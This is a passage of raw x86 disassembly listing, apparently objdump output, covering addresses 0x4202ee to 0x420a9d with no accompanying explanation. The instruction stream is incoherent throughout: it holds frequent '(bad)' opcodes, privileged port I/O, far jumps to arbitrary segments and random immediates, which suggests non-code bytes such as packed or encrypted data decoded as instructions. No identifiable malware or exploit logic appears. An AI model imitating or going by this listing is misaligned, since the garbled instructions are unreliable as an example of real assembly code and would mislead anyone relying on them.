  4202ee:	mov    ebp,0xb56a6b68
  4202f3:	sbb    al,0x67
  4202f5:	xor    BYTE PTR [esp+edi*4],bh
  4202f8:	(bad)  
  4202f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202fa:	jbe    0x420296
  4202fc:	in     al,dx
  4202fd:	mov    eax,0xe692f6b0
  420302:	in     al,dx
  420303:	gs cld 
  420305:	dec    ebp
  420306:	in     al,dx
  420307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420308:	fwait
  420309:	dec    ebx
  42030a:	pop    esi
  42030b:	loopne 0x4202f6
  42030d:	and    eax,0xa76cd3fd
  420312:	push   edi
  420313:	and    DWORD PTR [ebp-0x9e3bdfb],ebx
  420319:	les    edi,FWORD PTR [esi+0x7cbe6ee2]
  42031f:	jl     0x42036f
  420321:	fcom   QWORD PTR [eax-0x2fe481c]
  420327:	mov    ds:0xc579cef5,eax
  42032c:	inc    ebx
  42032d:	inc    esp
  42032e:	(bad)  
  42032f:	mov    al,ds:0x382edf7e
  420334:	in     al,dx
  420335:	repz (bad)
  420338:	or     eax,ecx
  42033a:	cld    
  42033b:	int    0xcd
  42033d:	or     DWORD PTR [ecx+0x19],esi
  420340:	mov    ebp,DWORD PTR [ebp-0x39]
  420343:	mov    edx,ds
  420345:	inc    ecx
  420346:	std    
  420347:	or     al,0xe2
  420349:	sub    eax,0x51b36791
  42034e:	std    
  42034f:	call   0x6ae10499
  420354:	aaa    
  420355:	fisubr DWORD PTR [edi-0x35]
  420358:	jb     0x42032c
  42035a:	jmp    0x4202fa
  42035c:	jnp    0x420325
  42035e:	jl     0x42030b
  420360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420361:	std    
  420362:	cld    
  420363:	dec    ebx
  420364:	in     eax,0x9a
  420366:	sti    
  420367:	jmp    0x420343
  420369:	xchg   ebx,eax
  42036a:	stos   DWORD PTR es:[edi],eax
  42036b:	enter  0x18dd,0x44
  42036f:	and    eax,0x2cdb32c8
  420374:	jmp    0x42034f
  420376:	jge    0x420344
  420378:	loope  0x420342
  42037a:	push   eax
  42037b:	nop
  42037c:	(bad)  
  42037d:	stc    
  42037e:	enter  0x6c83,0xb
  420382:	jmp    DWORD PTR [esi]
  420384:	push   ecx
  420385:	loopne 0x420310
  420387:	imul   BYTE PTR [ebx]
  420389:	dec    eax
  42038a:	cmp    al,al
  42038c:	jmp    0x530b:0x3de9f6c5
  420393:	pop    eax
  420394:	xor    ebp,DWORD PTR [edx+0x48]
  420397:	enter  0xa1e7,0x87
  42039b:	ret    
  42039c:	hlt    
  42039d:	pop    DWORD PTR [ebx-0x479c14e6]
  4203a3:	int    0xe1
  4203a5:	mov    ah,0x6
  4203a7:	add    esi,ebp
  4203a9:	fucomip st,st(6)
  4203ab:	mov    ebp,0xa2d65ffa
  4203b0:	pop    ecx
  4203b1:	xor    bh,ch
  4203b3:	inc    esi
  4203b4:	mov    ebx,0xcd3f6baa
  4203b9:	mov    al,0x44
  4203bb:	enter  0x95ea,0xb7
  4203bf:	jecxz  0x42041d
  4203c1:	or     dh,BYTE PTR ds:0x510fe927
  4203c7:	(bad)  
  4203c8:	pushf  
  4203c9:	mov    al,ds:0x8b000813
  4203ce:	add    bl,ah
  4203d0:	and    eax,0xc0ebfce6
  4203d5:	xchg   ecx,eax
  4203d6:	mov    ecx,0xfbc6ca48
  4203db:	call   0x2bdaf5b9
  4203e0:	dec    ebx
  4203e1:	ins    BYTE PTR es:[edi],dx
  4203e2:	test   BYTE PTR [edx+0x3a],ah
  4203e5:	cmp    eax,edx
  4203e7:	enter  0x7235,0xbe
  4203eb:	mov    esi,DWORD PTR [esp+esi*8-0x1ff8cd5a]
  4203f2:	cld    
  4203f3:	add    eax,0x498a9fc9
  4203f8:	aam    0x7e
  4203fa:	xlat   BYTE PTR ds:[ebx]
  4203fb:	xchg   ebp,eax
  4203fc:	mov    ds:0xebaaf2ab,al
  420401:	fsub   QWORD PTR [eax+0x25db0667]
  420407:	stos   BYTE PTR es:[edi],al
  420408:	(bad)  
  420409:	push   ebx
  42040a:	mov    ?,WORD PTR [edi-0x55]
  42040d:	sbb    ah,BYTE PTR [edx]
  42040f:	pop    eax
  420410:	mov    ch,0xd2
  420412:	outs   dx,DWORD PTR ds:[esi]
  420413:	enter  0x7f8a,0x4d
  420417:	dec    ecx
  420418:	adc    BYTE PTR [eax+0x30],dh
  42041b:	push   es
  42041c:	jmp    0x420435
  42041e:	(bad)  
  420420:	cs (bad) 
  420422:	lods   al,BYTE PTR ds:[esi]
  420423:	ror    DWORD PTR [ebp-0x21],cl
  420426:	sbb    eax,0x36c2c59d
  42042b:	and    BYTE PTR [ecx+0x21],bl
  42042e:	std    
  42042f:	mov    ?,WORD PTR [esi+0x27902351]
  420435:	stos   DWORD PTR es:[edi],eax
  420436:	or     al,cl
  420438:	(bad)  
  42043a:	xchg   esp,eax
  42043b:	xlat   BYTE PTR ds:[ebx]
  42043c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043d:	or     ebx,edx
  42043f:	sub    eax,0x2d6171be
  420444:	jmp    0x420451
  420446:	push   es
  420447:	out    0xd2,eax
  420449:	mov    al,0x32
  42044b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42044c:	jmp    0x420481
  42044e:	je     0x42046c
  420450:	and    edx,esp
  420452:	push   ebp
  420453:	stc    
  420454:	jae    0x420435
  420456:	test   BYTE PTR [ebp-0x2102b1a],0xa3
  42045d:	xlat   BYTE PTR ds:[ebx]
  42045e:	call   DWORD PTR [edi]
  420460:	sbb    eax,0xbcae66db
  420465:	nop
  420466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420467:	dec    ecx
  420468:	dec    ecx
  420469:	sub    BYTE PTR [ebp-0xc],bh
  42046c:	sub    ebx,DWORD PTR [eax+0x3c]
  42046f:	into   
  420470:	mov    ds:0x8b6b0f7a,eax
  420475:	call   0x61fd:0xdab2142
  42047c:	fadd   DWORD PTR [edx-0x5c]
  42047f:	jmp    0xe19760a0
  420484:	xchg   ecx,eax
  420485:	push   0x6d06b97d
  42048a:	jne    0x4204c1
  42048c:	adc    al,0x64
  42048e:	std    
  42048f:	or     eax,0x30152328
  420494:	dec    ebp
  420495:	sbb    BYTE PTR [esi-0x537cfe38],bl
  42049b:	cmp    ebp,DWORD PTR [esi-0x69]
  42049e:	js     0x4204c5
  4204a0:	ret    
  4204a1:	int    0x81
  4204a3:	mov    esi,0xb67d438c
  4204a8:	inc    ecx
  4204a9:	stc    
  4204aa:	iret   
  4204ab:	sbb    ch,ah
  4204ad:	add    al,0x76
  4204af:	fsub   st(3),st
  4204b1:	or     al,0x35
  4204b3:	stos   DWORD PTR es:[edi],eax
  4204b4:	xor    BYTE PTR [edx+0x53ebfd87],bl
  4204ba:	dec    edx
  4204bb:	push   edx
  4204bc:	aam    0x6b
  4204be:	xor    al,0xb9
  4204c0:	repz fdivr QWORD PTR [ebp-0x28]
  4204c4:	out    0x6d,eax
  4204c6:	jns    0x420539
  4204c8:	imul   ecx,esi,0xffffff9b
  4204cb:	push   ss
  4204cc:	jmp    0x420538
  4204ce:	xlat   BYTE PTR ds:[ebx]
  4204cf:	sub    al,BYTE PTR [eax]
  4204d1:	sar    DWORD PTR [edi],0xe5
  4204d4:	add    eax,0xd88fb1df
  4204d9:	jne    0x420513
  4204db:	in     al,dx
  4204dc:	push   cs
  4204dd:	xchg   edi,eax
  4204de:	cld    
  4204df:	add    DWORD PTR [ebx],eax
  4204e1:	mov    bl,0x4d
  4204e3:	cmp    BYTE PTR [edi-0x7c],0x41
  4204e7:	enter  0x37f6,0xa3
  4204eb:	add    al,0x4a
  4204ed:	leave  
  4204ee:	fisub  WORD PTR [edi]
  4204f0:	jmp    0x4204a8
  4204f2:	sbb    al,0x56
  4204f4:	fwait
  4204f5:	aam    0x18
  4204f7:	jmp    DWORD PTR [edx]
  4204f9:	or     ebp,DWORD PTR [edi+0x67cc6b73]
  4204ff:	xchg   BYTE PTR [edx-0x1b6e9e3b],dl
  420505:	pop    esi
  420506:	and    bh,al
  420508:	ss call 0xe64f:0xc03e8b6c
  420510:	cmp    edx,esi
  420512:	stc    
  420513:	xchg   edi,eax
  420514:	out    0xdf,al
  420516:	xchg   ebx,eax
  420517:	pop    es
  420518:	in     eax,0xbb
  42051a:	clc    
  42051b:	test   BYTE PTR [edx+0x5d],dh
  42051e:	and    bh,BYTE PTR [ebp+0x51c99ff1]
  420524:	les    edx,FWORD PTR [edi*8+0x4062f40]
  42052b:	mov    ah,0x76
  42052d:	ffreep st(2)
  42052f:	xor    DWORD PTR [edi-0x6b],edx
  420532:	mov    ds:0xfd763f25,al
  420537:	mov    cl,BYTE PTR [eax+edi*1]
  42053a:	pop    esi
  42053b:	fild   DWORD PTR [ebp+0x1bcf993d]
  420541:	cli    
  420542:	push   ecx
  420544:	stos   DWORD PTR es:[edi],eax
  420545:	scas   eax,DWORD PTR es:[edi]
  420546:	mov    al,ds:0xfd564fa5
  42054b:	and    eax,0x86e43ed7
  420550:	and    edi,ebp
  420552:	push   ebx
  420553:	leave  
  420554:	pop    ebx
  420555:	push   ebp
  420556:	rol    BYTE PTR [edx+0xf483f8],0xf7
  42055d:	lahf   
  42055e:	or     ch,0x19
  420561:	push   edi
  420562:	std    
  420563:	aad    0x6a
  420565:	(bad)  
  420566:	sti    
  420567:	shl    BYTE PTR [bx+si],1
  42056a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42056b:	enter  0xbf59,0xe
  42056f:	adc    bl,BYTE PTR [edx+0x5e]
  420572:	add    al,0xd3
  420574:	jmp    0x42055a
  420576:	stos   BYTE PTR es:[edi],al
  420577:	mov    al,0x3d
  420579:	inc    eax
  42057a:	or     ebx,esi
  42057c:	or     ebx,edi
  42057e:	inc    ebx
  42057f:	in     al,dx
  420580:	pop    esi
  420581:	in     eax,0x74
  420583:	clc    
  420584:	dec    ebp
  420585:	adc    BYTE PTR [ebx],ah
  420587:	dec    esp
  420588:	jmp    0x4205e0
  42058a:	loop   0x420533
  42058c:	push   edx
  42058d:	jl     0x420562
  42058f:	xor    ah,BYTE PTR [eax-0x21]
  420592:	pusha  
  420593:	adc    al,0xf7
  420595:	clc    
  420596:	lods   eax,DWORD PTR ds:[esi]
  420597:	das    
  420598:	lods   eax,DWORD PTR ds:[esi]
  420599:	pop    ss
  42059a:	std    
  42059b:	daa    
  42059c:	arpl   WORD PTR [ebp+0x30b7050c],cx
  4205a2:	dec    eax
  4205a3:	enter  0x3761,0x34
  4205a7:	repnz sub edx,DWORD PTR [esi]
  4205aa:	jge    0x42053a
  4205ac:	in     al,dx
  4205ad:	inc    ebx
  4205ae:	push   0xffffffec
  4205b0:	fadd   st(1),st
  4205b2:	jp     0x420603
  4205b4:	pop    ds
  4205b5:	mov    dh,0xc9
  4205b7:	mov    edx,0xc85caad0
  4205bc:	hlt    
  4205bd:	ss dec eax
  4205bf:	(bad)  
  4205c0:	pop    ebp
  4205c1:	pop    ebx
  4205c2:	std    
  4205c3:	div    BYTE PTR [edi-0x6e457196]
  4205c9:	icebp  
  4205ca:	icebp  
  4205cb:	mov    al,ds:0x527ddf8b
  4205d0:	lods   eax,DWORD PTR ds:[esi]
  4205d1:	push   edi
  4205d2:	pop    ecx
  4205d3:	mov    ebx,0xb3004fe9
  4205d8:	int3   
  4205d9:	jmp    0x880cb5d0
  4205de:	mov    ds:0x7edf3b6c,al
  4205e3:	lods   eax,DWORD PTR ds:[esi]
  4205e4:	test   BYTE PTR [ebx+0x509bef49],ch
  4205ea:	pushf  
  4205eb:	fld    DWORD PTR [edi+0x33]
  4205ee:	xchg   esp,eax
  4205ef:	fucomp st(3)
  4205f1:	scas   al,BYTE PTR es:[edi]
  4205f2:	aam    0x91
  4205f4:	or     edx,DWORD PTR [ebx-0x203ea299]
  4205fa:	mov    edx,esi
  4205fc:	not    BYTE PTR [ecx+eax*4+0x85004b]
  420603:	jne    0x42067d
  420605:	out    0x1d,eax
  420607:	clc    
  420608:	push   es
  420609:	(bad)  
  42060a:	cmp    al,0xa6
  42060c:	or     ecx,DWORD PTR fs:[ecx]
  42060f:	push   0x6b
  420611:	loope  0x4205f3
  420613:	jo     0x420635
  420615:	mov    cl,0x2b
  420617:	adc    eax,0x50a644e6
  42061c:	cmp    al,0x2
  42061e:	lods   eax,DWORD PTR ds:[esi]
  42061f:	pushf  
  420620:	and    eax,0x76dd75d1
  420625:	mov    WORD PTR [edi-0x19],?
  420628:	ds mov eax,0x5a2a662d
  42062e:	je     0x4205d8
  420630:	mov    dl,0xde
  420632:	ss shr ebx,cl
  420635:	cwde   
  420636:	aam    0x54
  420638:	leave  
  420639:	xchg   esi,eax
  42063a:	retf   0xe981
  42063d:	pop    es
  42063e:	mov    eax,DWORD PTR [edi+0x6b]
  420641:	mov    ah,0xd5
  420643:	(bad)  
  420644:	scas   eax,DWORD PTR es:[edi]
  420645:	dec    ebp
  420646:	xchg   edx,eax
  420647:	je     0x420634
  420649:	xor    BYTE PTR [edi],0x1c
  42064c:	push   edi
  42064d:	mov    ds:0xdfd57390,eax
  420652:	ins    DWORD PTR es:[edi],dx
  420653:	and    al,0xe2
  420655:	imul   eax,edx,0xfd6c2c27
  42065b:	mov    al,0xbe
  42065d:	add    esi,DWORD PTR [edx+0x64]
  420660:	sub    eax,0xd4c7fafd
  420665:	out    dx,al
  420666:	mov    al,0x45
  420668:	mov    cl,0xbc
  42066a:	gs out 0xeb,al
  42066d:	arpl   WORD PTR [ebp+edi*1-0x7dec4c40],dx
  420674:	xchg   edx,eax
  420675:	int3   
  420676:	in     eax,0xce
  420678:	jl     0x4206bb
  42067a:	push   esi
  42067b:	mov    bh,0xea
  42067d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42067e:	jne    0x4206c9
  420680:	and    ecx,DWORD PTR [ebx]
  420682:	mov    dl,0x9c
  420684:	jmp    0xdd23:0xa98d2d54
  42068b:	pop    edi
  42068c:	mov    edi,0xd6be4805
  420691:	cld    
  420692:	mov    dl,0x49
  420694:	sti    
  420695:	xor    ecx,ecx
  420697:	cmp    ebp,DWORD PTR [edi+0x512c1542]
  42069d:	addr16 std 
  42069f:	mov    ebp,0xd0120b32
  4206a4:	(bad)  
  4206a5:	cld    
  4206a6:	dec    esp
  4206a7:	into   
  4206a8:	push   cs
  4206a9:	jl     0x420726
  4206ab:	loop   0x4206b8
  4206ad:	rcl    DWORD PTR [ebp-0x77],cl
  4206b0:	scas   al,BYTE PTR es:[edi]
  4206b1:	(bad)  
  4206b3:	hlt    
  4206b4:	ins    DWORD PTR es:[edi],dx
  4206b5:	pop    esi
  4206b6:	fst    DWORD PTR [esi+0x19]
  4206b9:	das    
  4206ba:	inc    eax
  4206bb:	sbb    BYTE PTR [edx],al
  4206bd:	ficom  DWORD PTR [ebx]
  4206bf:	push   eax
  4206c0:	or     DWORD PTR [ecx+0x3d],edx
  4206c3:	fmul   DWORD PTR [edx+0x71]
  4206c6:	xor    eax,0x7094f207
  4206cb:	in     al,dx
  4206cc:	rcr    edi,0x1
  4206cf:	aaa    
  4206d0:	cmp    esi,eax
  4206d2:	push   esi
  4206d3:	enter  0x8d19,0xdf
  4206d7:	repnz lock mov eax,ds:0x47eb0648
  4206de:	xor    al,0x4
  4206e0:	xor    eax,eax
  4206e2:	leave  
  4206e3:	add    cl,BYTE PTR [edi]
  4206e5:	sti    
  4206e6:	stos   BYTE PTR es:[edi],al
  4206e7:	add    BYTE PTR [eax],bl
  4206e9:	fistp  WORD PTR [eax]
  4206eb:	idiv   BYTE PTR [ecx-0x47]
  4206ee:	pop    es
  4206ef:	add    ebp,ebx
  4206f1:	imul   edi,DWORD PTR [edx],0x2e38fa49
  4206f7:	cwde   
  4206f8:	add    eax,0xb6b894de
  4206fd:	pop    ds
  4206fe:	or     ecx,edx
  420700:	fisttp DWORD PTR [ebx+0x4e]
  420703:	leave  
  420704:	mov    edi,0xb9c86e2a
  420709:	xchg   ebp,eax
  42070a:	scas   eax,DWORD PTR es:[di]
  42070c:	add    BYTE PTR [esi+0x5ea0bb34],0xc
  420713:	enter  0x672b,0x64
  420717:	loop   0x420782
  420719:	pop    eax
  42071a:	(bad)  
  42071b:	jmp    0xeab5:0x207bba43
  420722:	enter  0xd36a,0x50
  420726:	mov    ebp,0x33dfc4ce
  42072b:	ins    DWORD PTR es:[edi],dx
  42072c:	fdivr  st,st(3)
  42072e:	jge    0xf23f570e
  420734:	pop    esi
  420735:	push   edi
  420736:	push   esp
  420737:	cdq    
  420738:	add    BYTE PTR [edi-0x5ed13734],0xd5
  42073f:	sbb    eax,DWORD PTR [edx-0x13576a58]
  420745:	cmp    DWORD PTR [esi-0x1fa5f4ce],ebx
  42074b:	dec    ecx
  42074c:	aaa    
  42074d:	jecxz  0x420734
  42074f:	(bad)  
  420750:	mov    ebx,?
  420752:	or     edi,DWORD PTR [ebp-0x44]
  420755:	lahf   
  420756:	(bad)  
  420757:	mov    ch,0x5
  420759:	outs   dx,BYTE PTR ds:[esi]
  42075a:	std    
  42075b:	adc    esp,eax
  42075d:	dec    edx
  42075e:	sub    esi,eax
  420760:	pop    ecx
  420761:	es ret 
  420763:	jecxz  0x420757
  420765:	xchg   esp,esi
  420767:	jl     0x420795
  420769:	enter  0x16bb,0x5a
  42076d:	mov    edi,0x8e5f35ae
  420772:	clc    
  420773:	xchg   ecx,eax
  420774:	xchg   edi,eax
  420775:	cmp    BYTE PTR [eax-0x37],ch
  420778:	xchg   ebp,eax
  420779:	adc    DWORD PTR [edi],ecx
  42077b:	add    ecx,DWORD PTR [edi]
  42077d:	pop    edi
  42077e:	and    eax,0x39ad29c8
  420783:	jmp    0xc93e60a
  420788:	out    0xa,al
  42078a:	xor    al,BYTE PTR [esi+0x33]
  42078d:	mov    ch,ch
  42078f:	or     eax,0xc565cf31
  420794:	xchg   esp,eax
  420795:	xchg   edx,eax
  420796:	scas   al,BYTE PTR es:[edi]
  420797:	neg    bl
  420799:	pusha  
  42079a:	jg     0x420807
  42079c:	retf   
  42079d:	int3   
  42079e:	jl     0x4207dd
  4207a0:	sub    al,0xa9
  4207a2:	cld    
  4207a3:	mov    esi,DWORD PTR [edx-0x3029fdc2]
  4207a9:	std    
  4207aa:	and    ecx,eax
  4207ac:	mov    ds:0x4422aea8,al
  4207b1:	rcr    BYTE PTR [ecx-0x40cc14dd],0x88
  4207b8:	mov    dh,0xb4
  4207ba:	(bad)  
  4207bc:	jmp    0xa4740ca0
  4207c1:	out    dx,al
  4207c2:	push   0xfd4bf19f
  4207c7:	mov    ah,BYTE PTR ds:[ebx+0x72]
  4207cb:	pop    es
  4207cc:	mov    WORD PTR [eax+0x6e],cs
  4207cf:	enter  0xcb06,0x85
  4207d3:	outs   dx,DWORD PTR ds:[esi]
  4207d4:	mov    edx,0xfe7c4b5
  4207d9:	aaa    
  4207da:	inc    BYTE PTR [edx-0xa]
  4207dd:	jl     0x42081c
  4207df:	mov    fs,WORD PTR [ebx-0x62]
  4207e2:	int3   
  4207e3:	push   ds
  4207e4:	push   ebx
  4207e5:	fsubr  st(5),st
  4207e7:	mov    esp,0xcd78527b
  4207ec:	and    edi,DWORD PTR [edi+eiz*2]
  4207ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207f0:	in     al,dx
  4207f1:	iret   
  4207f2:	fldenv [ebp-0x11]
  4207f5:	shl    DWORD PTR [eax-0x47d29429],1
  4207fb:	test   DWORD PTR ds:0x21b3e4a6,edi
  420801:	dec    ebp
  420802:	std    
  420803:	mov    ch,0xed
  420805:	pop    ss
  420806:	push   ebx
  420807:	fist   WORD PTR [esi+0x7a]
  42080a:	(bad)  
  42080b:	pop    eax
  42080c:	cmp    bl,bh
  42080e:	jbe    0x420803
  420810:	int    0xe2
  420812:	out    dx,eax
  420813:	add    ch,BYTE PTR [eax-0x106003c9]
  420819:	sbb    eax,0x93ba68e4
  42081e:	push   edx
  42081f:	and    BYTE PTR [edi-0x793800e8],dl
  420825:	shr    BYTE PTR [edx-0x4a07a475],1
  42082b:	push   esi
  42082c:	in     eax,dx
  42082d:	fsubr  QWORD PTR [ebp+0x2b]
  420830:	sub    bl,BYTE PTR [edi-0x828d7ef]
  420836:	repz (bad) 
  420838:	pusha  
  420839:	xor    eax,0x5abd192d
  42083e:	div    bl
  420840:	out    0x64,eax
  420842:	dec    eax
  420843:	push   eax
  420844:	push   ebp
  420845:	enter  0xd2be,0xc0
  420849:	ds push ebx
  42084b:	jbe    0x4207f8
  42084d:	and    ebx,DWORD PTR [ecx+ebp*1]
  420850:	dec    esi
  420851:	jmp    0x5f19cf95
  420856:	fld    DWORD PTR [eax+0x25]
  420859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085a:	in     eax,0x23
  42085c:	call   0xeb672cbd
  420861:	cmp    al,0x92
  420863:	cmp    al,0x86
  420865:	imul   ebx,esp,0xd5df7a47
  42086b:	rcl    al,cl
  42086d:	inc    ebx
  42086e:	pop    ebx
  42086f:	xor    ch,BYTE PTR [ebx]
  420871:	pop    ss
  420872:	std    
  420873:	mov    bh,ch
  420875:	add    eax,0xffffffc5
  420878:	jge    0x42082b
  42087a:	pop    edi
  42087b:	iret   
  42087c:	sahf   
  42087d:	lds    edi,FWORD PTR [ebp+0x15]
  420880:	mov    WORD PTR [ebx-0x77],cs
  420883:	js     0x420886
  420885:	adc    dh,bl
  420887:	pop    ds
  420888:	out    0x29,al
  42088a:	sbb    al,0xc3
  42088c:	test   al,0xc6
  42088e:	ins    DWORD PTR es:[edi],dx
  42088f:	rcr    BYTE PTR [edx+0x4f],1
  420892:	(bad)  
  420893:	pusha  
  420894:	or     edi,DWORD PTR [esi]
  420896:	dec    edi
  420897:	ror    DWORD PTR [ebx],cl
  420899:	cld    
  42089a:	inc    eax
  42089b:	inc    ebx
  42089c:	jmp    0x42082b
  42089e:	push   esi
  42089f:	leave  
  4208a0:	out    dx,eax
  4208a1:	sti    
  4208a2:	repnz mov eax,ds:0x88c67953
  4208a8:	and    bh,al
  4208aa:	mov    al,0x76
  4208ac:	cmp    al,0xdf
  4208ae:	push   ecx
  4208af:	mov    al,ds:0x33e17bb1
  4208b4:	sub    DWORD PTR [esi],edx
  4208b6:	std    
  4208b7:	adc    al,0x8f
  4208b9:	sbb    BYTE PTR [esi-0x57],ah
  4208bc:	xor    BYTE PTR [eax+0xf],cl
  4208bf:	enter  0x62d2,0x4
  4208c3:	arpl   WORD PTR [esi-0x35],cx
  4208c6:	cmp    al,0x1
  4208c8:	jmp    0x4208ea
  4208ca:	jl     0x4208aa
  4208cc:	mov    dh,0x21
  4208ce:	cld    
  4208cf:	lahf   
  4208d0:	add    ebx,edi
  4208d2:	mov    ss,WORD PTR [ecx+0x18]
  4208d5:	xchg   edx,eax
  4208d6:	xchg   esp,eax
  4208d7:	pop    ecx
  4208d8:	scas   eax,DWORD PTR es:[edi]
  4208d9:	dec    esi
  4208da:	push   ecx
  4208db:	or     BYTE PTR [ebx-0x4d],al
  4208de:	cld    
  4208df:	mov    dl,0xcd
  4208e1:	jns    0x4208ce
  4208e3:	pusha  
  4208e4:	dec    ecx
  4208e5:	inc    ecx
  4208e6:	test   ecx,ecx
  4208e8:	ror    BYTE PTR [eax-0x2b7006ca],cl
  4208ee:	adc    bl,al
  4208f0:	lock cmp ch,0xa5
  4208f4:	cmp    eax,0x64b85043
  4208f9:	pusha  
  4208fa:	addr16 loopne 0x42094a
  4208fd:	ds jge 0x420978
  420900:	in     al,dx
  420901:	pop    ecx
  420902:	mov    edi,0xfd765bb7
  420907:	add    cl,bh
  420909:	xchg   BYTE PTR [di],dh
  42090c:	aad    0xd2
  42090e:	and    ecx,eax
  420910:	cmp    BYTE PTR [ecx-0x43],al
  420913:	ins    DWORD PTR es:[edi],dx
  420914:	icebp  
  420915:	and    DWORD PTR [edx+0x286be270],edi
  42091b:	(bad)  
  42091c:	cdq    
  42091d:	mov    edx,0x4a3b8975
  420922:	outs   dx,DWORD PTR ds:[esi]
  420923:	cmp    dl,BYTE PTR [edi+ebx*8+0x7957f7d1]
  42092a:	push   esp
  42092b:	add    ebp,eax
  42092d:	and    ebp,0x7d
  420930:	jmp    0x91e6:0xfd47fcc9
  420937:	xor    ah,bl
  420939:	sbb    al,0x27
  42093b:	enter  0x3cf2,0x7c
  42093f:	cmp    al,0x8c
  420941:	in     al,dx
  420942:	test   DWORD PTR [edx-0x493f4f16],edx
  420948:	xchg   ebx,eax
  420949:	aas    
  42094a:	fmul   QWORD PTR [edi]
  42094c:	addr16 add eax,0xc0bbc7f2
  420952:	imul   eax,DWORD PTR [edx],0xddd7fbb8
  420958:	jmp    0x42093b
  42095a:	xor    al,BYTE PTR [eax]
  42095c:	enter  0x4ffe,0x67
  420960:	inc    eax
  420961:	fidiv  WORD PTR [esi+0x604dc4bf]
  420967:	mov    esp,0x10dabf73
  42096c:	loope  0x420990
  42096e:	test   al,0xcf
  420970:	or     eax,0xcf0a2e7b
  420975:	xor    ebp,eax
  420977:	pop    es
  420978:	mov    ebp,ebp
  42097a:	leave  
  42097b:	enter  0xf18f,0x4f
  42097f:	pop    esp
  420980:	xchg   ecx,eax
  420981:	and    ebx,DWORD PTR [ebx+0x69fceb36]
  420987:	adc    DWORD PTR [edx],0xe41a2a25
  42098d:	dec    ecx
  42098e:	pop    edi
  42098f:	enter  0x177f,0x2b
  420993:	mov    ah,0x89
  420995:	imul   BYTE PTR [eax-0x1c]
  420998:	jmp    0x42098f
  42099a:	pop    fs
  42099c:	push   cs
  42099d:	loopne 0x4209b8
  42099f:	hlt    
  4209a0:	dec    eax
  4209a1:	fistp  QWORD PTR [edx+0x377bb37d]
  4209a7:	loop   0x4209aa
  4209a9:	ret    0x19fc
  4209ac:	out    0x56,eax
  4209ae:	dec    esi
  4209af:	or     al,0x76
  4209b1:	outs   dx,BYTE PTR ds:[si]
  4209b3:	retf   
  4209b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209b5:	mov    edi,0xc229b60
  4209ba:	pop    esi
  4209bb:	popa   
  4209bc:	cmc    
  4209bd:	inc    edi
  4209be:	jns    0x4209c6
  4209c0:	jmp    0x42097f
  4209c2:	outs   dx,DWORD PTR ds:[esi]
  4209c3:	mov    dl,0x9c
  4209c5:	test   eax,0xd4406274
  4209ca:	jecxz  0x4209b9
  4209cc:	loopne 0x420958
  4209ce:	dec    esp
  4209cf:	dec    eax
  4209d0:	repz ds (bad) 
  4209d3:	hlt    
  4209d4:	pop    ecx
  4209d5:	fisttp WORD PTR [ebx+0x2d]
  4209d8:	xor    ebp,DWORD PTR [edi]
  4209da:	jmp    0x1492:0xfc9d7f48
  4209e1:	xor    al,0xf7
  4209e3:	stos   DWORD PTR es:[edi],eax
  4209e4:	iret   
  4209e5:	sub    esp,DWORD PTR ds:0x7fb6dac8
  4209eb:	pop    ecx
  4209ec:	push   0xeb975d5a
  4209f1:	pop    eax
  4209f2:	ins    BYTE PTR es:[edi],dx
  4209f3:	or     al,0x0
  4209f5:	push   0x76
  4209f7:	or     DWORD PTR [eax-0x62f07321],0x6e
  4209fe:	xchg   esi,eax
  4209ff:	inc    edx
  420a00:	dec    eax
  420a01:	arpl   WORD PTR [ebp-0x2b76a70],cx
  420a07:	stos   BYTE PTR es:[edi],al
  420a08:	fst    QWORD PTR [ebx]
  420a0a:	pop    ds
  420a0b:	jo     0x420994
  420a0d:	enter  0xc5b6,0x58
  420a11:	lds    ecx,FWORD PTR [ebx-0x1]
  420a14:	scas   eax,DWORD PTR es:[edi]
  420a15:	pop    esi
  420a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a17:	mov    esi,0xd05d1816
  420a1c:	js     0x420a52
  420a1e:	jmp    FWORD PTR [ecx]
  420a20:	pop    ds
  420a21:	out    dx,al
  420a22:	mov    edx,0x4a9f1d8f
  420a27:	pusha  
  420a28:	dec    eax
  420a29:	(bad)  
  420a2b:	adc    bh,bh
  420a2d:	push   ebp
  420a2e:	mov    esi,0xfcf96ace
  420a33:	xlat   BYTE PTR ds:[ebx]
  420a34:	imul   ebx,DWORD PTR [ecx-0x3f8b7dcf],0x774fc861
  420a3e:	cdq    
  420a3f:	inc    esi
  420a40:	rol    bl,cl
  420a42:	xchg   ebx,eax
  420a43:	cmp    ch,bl
  420a45:	xchg   esi,eax
  420a46:	sbb    BYTE PTR [edi],0x2f
  420a49:	jno    0x4209fb
  420a4b:	into   
  420a4c:	jo     0x420a38
  420a4e:	stc    
  420a4f:	jp     0x4209fa
  420a51:	pop    edi
  420a52:	mov    gs:0x8c5716e0,al
  420a58:	in     eax,dx
  420a59:	lahf   
  420a5a:	mov    DWORD PTR [ebx-0x39],ebx
  420a5d:	or     eax,0x6a5d26fd
  420a62:	mov    ecx,0xc9dff4f1
  420a67:	xor    BYTE PTR [esi-0x68a3ee95],al
  420a6d:	ins    BYTE PTR es:[edi],dx
  420a6e:	cdq    
  420a6f:	fsub   st(5),st
  420a71:	aas    
  420a72:	bound  ebx,QWORD PTR fs:0xf0d881bf
  420a79:	cmp    eax,0x5e14c85c
  420a7e:	inc    edi
  420a7f:	fcmove st,st(7)
  420a81:	push   ds
  420a82:	clc    
  420a83:	out    0xe6,eax
  420a85:	sub    DWORD PTR [ebp-0x1a],ebp
  420a88:	arpl   WORD PTR [ecx-0x5d5b1464],di
  420a8e:	aad    0x8b
  420a90:	or     al,0xab
  420a92:	add    al,0x1e
  420a94:	sbb    ch,bh
  420a96:	sbb    ah,dh
  420a98:	jmp    0x420ae2
  420a9a:	xor    al,0x5a
  420a9c:	pusha  
  420a9d:	mov    esi,0xdfc976f2
